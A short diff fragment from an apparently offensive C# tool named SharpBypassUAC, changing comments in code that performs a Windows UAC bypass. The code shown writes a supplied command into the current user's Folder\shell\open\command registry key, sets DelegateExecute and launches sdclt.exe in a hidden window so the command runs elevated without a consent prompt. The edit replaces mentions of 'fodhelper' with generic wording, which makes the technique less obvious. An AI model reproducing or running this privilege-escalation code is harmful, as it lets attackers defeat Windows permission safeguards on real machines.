@@ -30,7 +30,7 @@ namespace SharpBypassUAC
             //Convert encoded command to a string
             string command = Encoding.UTF8.GetString(encodedCommand);
 
-            //Set the registry key for fodhelper
+            //Set the registry key
             RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
             newkey.CreateSubKey(@"Folder\shell\open\command");
 
@@ -39,7 +39,7 @@ namespace SharpBypassUAC
             sdclt.SetValue("DelegateExecute", "");
             sdclt.Close();
 
-            //start fodhelper
+            //start process
             Process p = new Process();
             p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             p.StartInfo.FileName = "C:\\windows\\system32\\sdclt.exe";
